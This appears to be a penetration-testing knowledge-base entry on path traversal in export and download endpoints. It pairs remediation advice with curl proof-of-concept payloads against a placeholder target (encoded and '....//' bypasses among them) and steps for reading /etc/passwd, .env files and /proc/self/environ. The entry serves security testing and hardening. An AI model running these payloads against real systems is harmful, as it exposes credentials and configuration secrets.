---
title: Arbitrary file read through export / download endpoints
cve: None (implementation flaw)
severity: high
cvss: 8.6
product: Statements / report exports / voucher downloads
versions: Any
ports: 80, 443
keywords: arbitrary file read, download, export, path traversal, statements
entry: /api/report/export?file=../../../../etc/passwd
verified: false
sources: Compiled from public sources (implementation flaws; no CVE)
---

## Fingerprints

```
/api/report/export?file=2024-11.xlsx       /download?path=upload/1.jpg
/api/statement/export?name=...             /api/member/avatar?file=...
```

Parameters are directly concatenated into file paths without directory restrictions.

## Prerequisites

- An account (some export endpoints require only login; some frontend endpoints are anonymous).

## PoC

```bash
# Linux
curl -s --path-as-is 'https://target/api/report/export?file=../../../../etc/passwd'
curl -s --path-as-is 'https://target/api/report/export?file=/etc/passwd'

# Windows
curl -s --path-as-is 'https://target/api/report/export?file=..%5c..%5c..%5cwindows%5cwin.ini'

# Encoding bypass
curl -s --path-as-is 'https://target/api/report/export?file=..%2f..%2f..%2fetc%2fpasswd'
curl -s --path-as-is 'https://target/api/report/export?file=....//....//etc/passwd'
```

## Exploitation Steps

1. Find export/download endpoints; perform a normal export first to confirm parameter format and response type (stream or URL).
2. Try each of four forms once: `../`, absolute paths, encoding, and `....//`.
3. After success, read `/etc/passwd`, application configuration (`.env`, `config.php`, `application.yml`), and `/proc/self/environ`.
4. If logs are writable, read the access log for more paths; on Windows targets, read `C:\Windows\win.ini` to verify.
5. Evidence: one successful request + the first 20 lines; do not download entire files.

## Remediation and Mitigation (Hardening)

- Allow only allowlisted filenames (map IDs to disk paths); prohibit path concatenation.
- After `realpath`, verify the path remains inside the designated directory; use temporary signed URLs for downloads.
- Separate export directories from the webroot; minimize file permissions.

## References

- OWASP WSTG-ATHZ-01；CWE-22 Path Traversal。
